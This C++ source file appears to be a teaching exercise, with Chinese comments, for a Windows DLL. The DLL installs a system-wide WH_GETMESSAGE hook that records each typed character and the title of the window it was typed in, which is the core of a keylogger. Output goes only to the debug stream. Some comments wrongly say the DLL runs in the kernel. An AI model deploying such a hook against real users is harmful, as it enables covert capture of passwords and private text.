#include <iostream>
#include <Windows.h>

HINSTANCE g_hInstance = nullptr;
/// 我们希望hook被调用，在前文分析中，我们已经知道
/// 键盘按键在应用态是无法直接运行的
/// 所以，我们希望写一个dll，让这个dll被加载的内核位置
HHOOK g_hHook = nullptr;

LRESULT CALLBACK MsgHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (HC_ACTION == nCode)
    {
        /// 有消息到来
        PMSG pMsg = (PMSG)lParam;
        if (WM_CHAR == pMsg->message)
        {
            /// 说明当前windows有一个可供记录的键盘按下键的信息
            /// char szKey = (char)pMsg->wParam;
            /// std::cout << szKey << std::endl;
            /// 为什么不在dll中改成多字节
            /// 因为windows在底层是unicode的
            /// MessageBox(NULL, L"hello", L"ok", MB_OK);
            /// 因为我们的应用程序他的标注输出已经
            /// 占用了cout，因此dll中cout你看不到

            wchar_t szKey              = (wchar_t)pMsg->wParam;
            wchar_t szOutPut[MAXBYTE]  = { 0 };
            wchar_t szWinName[MAXBYTE] = { 0 };
            ::GetWindowText(pMsg->hwnd, szWinName, MAXBYTE);
            wsprintf(szOutPut, L"在窗口%s按键是%c", szWinName, szKey);
            ::OutputDebugString(szOutPut); //我们用debugview观测
        }
    }

    return ::CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

/// StartHook,是将来我们在GetBoardRec程序中申请调用的函数s
/// 我们申请调用StartHook,StartHook实在dll中，这个dll是可
/// 被windows加载到内核对应的区域中

extern "C" __declspec(dllexport) BOOL StartHook()
{
    if (g_hHook == nullptr)
    {
        /// 安装钩子
        g_hHook = ::SetWindowsHookEx(WH_GETMESSAGE, MsgHookProc, g_hInstance, 0);
        if (g_hHook == nullptr)
        {
            DWORD dwErr = ::GetLastError();
            return FALSE;
        }
    }
    return TRUE;
}

extern "C" __declspec(dllexport) BOOL StopHook()
{
    if (g_hHook != nullptr)
    {
        /// 卸载钩子
        BOOL bRet = ::UnhookWindowsHookEx(g_hHook);
        g_hHook   = nullptr;
        return bRet;
    }
    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID /* lpReserved */)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            g_hInstance = hModule;
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
